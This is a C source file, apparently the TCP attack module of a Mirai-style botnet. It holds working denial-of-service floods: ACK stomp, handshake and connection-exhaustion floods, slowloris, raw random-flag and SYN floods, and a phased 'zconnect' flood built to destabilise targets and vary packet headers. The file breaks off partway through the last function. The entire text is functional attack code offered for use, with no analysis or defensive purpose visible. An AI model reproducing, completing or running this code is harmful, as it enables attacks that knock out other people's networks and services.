#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "attack_stats.h"
#include <sys/uio.h>
#include <sys/syscall.h>
#if defined(__GLIBC__) && defined(__GLIBC_MINOR__)
#if (__GLIBC__ < 2) || (__GLIBC__ == 2 && __GLIBC_MINOR__ < 13)
struct mmsghdr {
    struct msghdr msg_hdr;
    unsigned int msg_len;
};
#endif
#elif !defined(__linux__)
struct mmsghdr {
    struct msghdr msg_hdr;
    unsigned int msg_len;
};
#endif
static inline void burst_send_packets(int fd, const struct sockaddr_in *addr, 
                                     char *packets, int pkt_len, int burst_count)
{
    int b;
    for (b = 0; b < burst_count; b++)
    {
        sendto(fd, packets, pkt_len, MSG_NOSIGNAL, (struct sockaddr *)addr, sizeof(struct sockaddr_in));
        if (b < burst_count - 1)
            usleep(rand_next() % 401);
    }
}
struct orbit_combo {
    uint8_t tos;
    uint8_t flags;
    uint8_t ttl_min;
    uint8_t ttl_max;
    uint16_t window;
    uint8_t df;
};
struct orbit_slot {
    struct mmsghdr mh;
    struct iovec iov;
    struct sockaddr_in addr;
    uint8_t buf[128];
};
static inline void orbit_flush_batch(int fd, struct orbit_slot *slots, int *slot_idx, BOOL *sendmmsg_available, int ratelimit)
{
    if (*slot_idx <= 0)
        return;
#if defined(__NR_sendmmsg)
    if (*sendmmsg_available)
    {
        int sent = syscall(__NR_sendmmsg, fd, &slots[0].mh, *slot_idx, MSG_NOSIGNAL);
        if (sent >= 0)
        {
            if (sent < *slot_idx)
            {
                int j;
                for (j = sent; j < *slot_idx; j++)
                    sendto(fd, slots[j].buf, slots[j].mh.msg_len, MSG_NOSIGNAL, (struct sockaddr *)&slots[j].addr, sizeof(struct sockaddr_in));
            }
            if (ratelimit > 0)
            {
                int sleep_us = (*slot_idx * 1000000) / ratelimit;
                if (sleep_us > 0)
                    usleep(sleep_us);
            }
            if ((rand_next() & 0x1f) == 0)
                usleep(rand_next() % 100);
            *slot_idx = 0;
            return;
        }
        if (errno == ENOSYS)
            *sendmmsg_available = FALSE;
    }
#endif
    {
        int i;
        for (i = 0; i < *slot_idx; i++)
            sendto(fd, slots[i].buf, slots[i].mh.msg_len, MSG_NOSIGNAL, (struct sockaddr *)&slots[i].addr, sizeof(struct sockaddr_in));
    }
    if (ratelimit > 0)
    {
        int sleep_us = (*slot_idx * 1000000) / ratelimit;
        if (sleep_us > 0)
            usleep(sleep_us);
    }
    if ((rand_next() & 0x1f) == 0)
        usleep(rand_next() % 100);
    *slot_idx = 0;
}
void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(rfd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;
        stomp_setup_nums:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);
        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));
                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;
                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);
                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;
                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;
                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }
            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}
void attack_tcp_handshake(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 8);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    time_t start = time(NULL);
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0)
                    continue;
                fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
                if (targs[i].netmask < 32)
                    addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    addr.sin_addr.s_addr = targs[i].addr;
                addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
                connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
                usleep(10000);
                    char payload[1024];
                    int j;
                    for (j = 0; j < (int)sizeof(payload); j++) payload[j] = rand_next() & 0xff;
                    send(fd, payload, sizeof(payload), MSG_NOSIGNAL);
                shutdown(fd, SHUT_WR);
                usleep(5000);
                close(fd);
            }
        }
        if (time(NULL) - start >= duration)
            break;
        usleep(500);
    }
}
void attack_tcp_connexhaust(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1000);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int *fds = calloc(max_conns, sizeof(int));
    if (fds == NULL)
        return;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    time_t start = time(NULL);
    while (TRUE)
    {
        int idx = 0;
        for (i = 0; i < targs_len && idx < max_conns; i++)
        {
            int r;
            for (r = 0; r < max_conns / targs_len && idx < max_conns; r++)
            {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0)
                    continue;
                fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
                if (targs[i].netmask < 32)
                    addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    addr.sin_addr.s_addr = targs[i].addr;
                addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
                connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
                fds[idx++] = fd;
            }
        }
        {
            int k;
            char payload[512];
            for (k = 0; k < (int)sizeof(payload); k++) payload[k] = rand_next() & 0xff;
            for (k = 0; k < idx; k++)
            {
                if (fds[k] > 0)
                    send(fds[k], payload, sizeof(payload), MSG_NOSIGNAL);
            }
        }
        {
            int closeN = idx / 3;
            int k;
            for (k = 0; k < closeN; k++)
            {
                if (fds[k] > 0)
                {
                    close(fds[k]);
                    fds[k] = -1;
                }
            }
        }
        if (time(NULL) - start >= duration)
            break;
        usleep(1000);
    }
    for (i = 0; i < max_conns; i++)
        if (fds[i] > 0) close(fds[i]);
    free(fds);
}
void attack_slowloris_tcp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 500);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int *fds = calloc(max_conns, sizeof(int));
    if (fds == NULL)
        return;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    time_t start = time(NULL);
    int idx = 0;
    for (i = 0; i < targs_len && idx < max_conns; i++)
    {
        int r;
        for (r = 0; r < max_conns / targs_len && idx < max_conns; r++)
        {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0)
                continue;
            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
            if (targs[i].netmask < 32)
                addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            else
                addr.sin_addr.s_addr = targs[i].addr;
            addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
            connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
            fds[idx++] = fd;
        }
    }
    usleep(100000);
    while (time(NULL) - start < duration)
    {
        for (i = 0; i < idx; i++)
        {
            if (fds[i] > 0)
            {
                char slowpayload[64];
                int len = rand_next() % 32 + 16;
                rand_str(slowpayload, len);
                if (send(fds[i], slowpayload, len, MSG_NOSIGNAL) <= 0)
                {
                    close(fds[i]);
                    fds[i] = socket(AF_INET, SOCK_STREAM, 0);
                    if (fds[i] >= 0)
                    {
                        fcntl(fds[i], F_SETFL, fcntl(fds[i], F_GETFL, 0) | O_NONBLOCK);
                        if (targs[i % targs_len].netmask < 32)
                            addr.sin_addr.s_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));
                        else
                            addr.sin_addr.s_addr = targs[i % targs_len].addr;
                        addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
                        connect(fds[i], (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
                    }
                }
            }
        }
        usleep(rand_next() % 5000 + 1000);
    }
    for (i = 0; i < max_conns; i++)
        if (fds[i] > 0) close(fds[i]);
    free(fds);
}
void attack_rs_media(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(rfd);
        return;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char packet[1024];
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
            char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
            iph->id = (ip_ident == 0xffff) ? rand_next() & 0xffff : htons(ip_ident);
            iph->frag_off = 0;
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->saddr = LOCAL_ADDR;
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            else
                iph->daddr = targs[i].addr;
            tcph->source = (sport == 0xffff) ? rand_next() & 0xffff : htons(sport);
            tcph->dest = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
            tcph->seq = htonl(rand_next());
            tcph->ack_seq = 0;
            tcph->doff = 5;
            tcph->syn = (rand_next() % 2) ? 1 : 0;
            tcph->ack = (rand_next() % 2) ? 1 : 0;
            tcph->psh = (rand_next() % 2) ? 1 : 0;
            tcph->fin = (rand_next() % 3 == 0) ? 1 : 0;
            tcph->rst = (rand_next() % 5 == 0) ? 1 : 0;
            tcph->window = htons(rand_next() & 0xffff);
            tcph->check = 0;
            tcph->urg_ptr = 0;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}
void attack_socket_flood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 32);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    int pool_size = 16; 
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    struct {
        int fd;
        ipv4_t target_ip;
        port_t target_port;
        uint32_t seq;
        uint32_t ack;
    } pool[16];
    for (i = 0; i < pool_size; i++)
    {
        pool[i].fd = -1;
        pool[i].target_ip = 0;
        pool[i].seq = rand_next();
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                int pool_idx = rand_next() % pool_size;
                char packet[2048];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                port_t src_port = (sport == 0xffff) ? (rand_next() % 60000 + 1024) : sport;
                port_t dst_port = (dport == 0xffff) ? 80 : dport;
                pool[pool_idx].target_ip = target_ip;
                pool[pool_idx].target_port = dst_port;
                uint32_t seq = pool[pool_idx].seq;
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = ip_tos;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = htons(rand_next() & 0xffff);
                iph->frag_off = htons(0x4000);
                iph->ttl = ip_ttl;
                iph->protocol = IPPROTO_TCP;
                iph->check = 0;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;
                tcph->source = htons(src_port);
                tcph->dest = htons(dst_port);
                tcph->seq = htonl(seq);
                tcph->ack_seq = 0;
                tcph->doff = 5;
                tcph->syn = 1;
                tcph->ack = 0;
                tcph->psh = 0;
                tcph->rst = 0;
                tcph->fin = 0;
                tcph->urg = 0;
                tcph->window = htons(65535);
                tcph->check = 0;
                tcph->urg_ptr = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                targs[i].sock_addr.sin_family = AF_INET;
                targs[i].sock_addr.sin_addr.s_addr = target_ip;
                targs[i].sock_addr.sin_port = htons(dst_port);
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                usleep(rand_next() % 401);
                int payload_size = data_len;
                if (payload_size > 1400)
                    payload_size = 1400;
                for (int k = 0; k < payload_size && k < 64; k++)
                    data[k] = (k % 94) + 33;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + (payload_size > 64 ? 64 : payload_size));
                tcph->syn = 0;
                tcph->ack = 1;
                tcph->psh = 1;
                tcph->seq = htonl(seq + 1);
                tcph->ack_seq = htonl(rand_next());
                tcph->check = 0;
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + (payload_size > 64 ? 64 : payload_size)), sizeof(struct tcphdr) + (payload_size > 64 ? 64 : payload_size));
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + (payload_size > 64 ? 64 : payload_size), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                usleep(rand_next() % 401);
                tcph->psh = 0;
                tcph->fin = 1;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->check = 0;
                tcph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                pool[pool_idx].seq = seq + 65; 
            }
        }
        usleep(rand_next() % 201); 
    }
    for (i = 0; i < pool_size; i++)
    {
        if (pool[i].fd != -1)
            close(pool[i].fd);
    }
    close(rfd);
}
void attack_zconnect(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 16);
    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    time_t start_time = time(NULL);
    int warmup_secs = 5 + (rand_next() % 6);
    int plateau_secs = (duration > warmup_secs + 5) ? (duration * 4 / 10) : 5;
    if (warmup_secs + plateau_secs > duration) plateau_secs = (duration > warmup_secs) ? (duration - warmup_secs) : 0;
    int phase = 0;
    while (TRUE)
    {
        time_t current_time = time(NULL);
        int elapsed = current_time - start_time;
        if (elapsed >= warmup_secs && phase == 0)
        {
            phase = 1;
#ifdef DEBUG
            printf("[zconnect] phase -> plateau\n");
#endif
        }
        else if (elapsed >= warmup_secs + plateau_secs && phase == 1)
        {
            phase = 2;
#ifdef DEBUG
            printf("[zconnect] phase -> destabilization\n");
#endif
        }
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char packet[2048];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                port_t src_port = (sport == 0xffff) ? (rand_next() % 60000 + 1024) : sport;
                port_t dst_port = (dport == 0xffff) ? 80 : dport;
                uint32_t seq = rand_next();
                if (phase == 0)
                {
                    iph->version = 4;
                    iph->ihl = 5;
                    iph->tos = ip_tos;
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                    iph->id = htons(rand_next() & 0xffff);
                    iph->frag_off = htons(0x4000); 
                    iph->ttl = ip_ttl;
                    iph->protocol = IPPROTO_TCP;
                    iph->check = 0;
                    iph->saddr = LOCAL_ADDR;
                    iph->daddr = target_ip;
                    tcph->source = htons(src_port);
                    tcph->dest = htons(dst_port);
                    tcph->seq = htonl(seq);
                    tcph->ack_seq = 0;
                    tcph->doff = 5;
                    tcph->syn = 1;
                    tcph->ack = 0;
                    tcph->psh = 0;
                    tcph->rst = 0;
                    tcph->fin = 0;
                    tcph->urg = 0;
                    tcph->window = htons(65535);
                    tcph->check = 0;
                    tcph->urg_ptr = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                    targs[i].sock_addr.sin_port = htons(dst_port);
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    tcph->syn = 0; tcph->ack = 1; tcph->seq = htonl(seq + 1); tcph->ack_seq = htonl(rand_next());
                    tcph->check = 0; tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    usleep(15000);
                }
                else if (phase == 1)
                {
                    int payload_size = data_len;
                    if (payload_size > 1200) payload_size = 1200;
                    iph->version = 4; iph->ihl = 5; iph->tos = ip_tos;
                    iph->id = htons(rand_next() & 0xffff);
                    iph->frag_off = htons(0x4000);
                    iph->ttl = ip_ttl; iph->protocol = IPPROTO_TCP; iph->saddr = LOCAL_ADDR; iph->daddr = target_ip;
                    tcph->source = htons(src_port);
                    tcph->dest = htons(dst_port);
                    tcph->seq = htonl(seq + 1);
                    tcph->ack = 1; tcph->psh = 1; tcph->doff = 5;
                    tcph->window = htons(65535);
                    if (dst_port == 80 || dst_port == 8080)
                    {
                        char *http_req = "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: **\r\nConnection: keep-alive\r\n\r\n";
                        int http_len = strlen(http_req);
                        if (http_len > data_len) http_len = data_len;
                        memcpy(data, http_req, http_len);
                    }
                    else
                    {
                        for (int k = 0; k < data_len; k++)
                            data[k] = (k % 94) + 33;
                    }
                    iph->check = 0;
                    tcph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    usleep(500);
                    tcph->syn = (rand_next() % 2) ? 1 : 0;
                    tcph->ack = (rand_next() % 2) ? 1 : 0;
                    tcph->psh = (rand_next() % 2) ? 1 : 0;
                    tcph->fin = (rand_next() % 3 == 0) ? 1 : 0;
                    tcph->rst = (rand_next() % 5 == 0) ? 1 : 0;
                    tcph->urg = (rand_next() % 7 == 0) ? 1 : 0;
                    tcph->window = htons(rand_next() & 0xffff);
                    tcph->seq = htonl(rand_next());
                    tcph->ack_seq = htonl(rand_next());
                    iph->id = htons(rand_next() & 0xffff);
                    iph->ttl = rand_next() % 64 + 32;
                    iph->tos = rand_next() & 0xff;
                    iph->check = 0;
                    tcph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
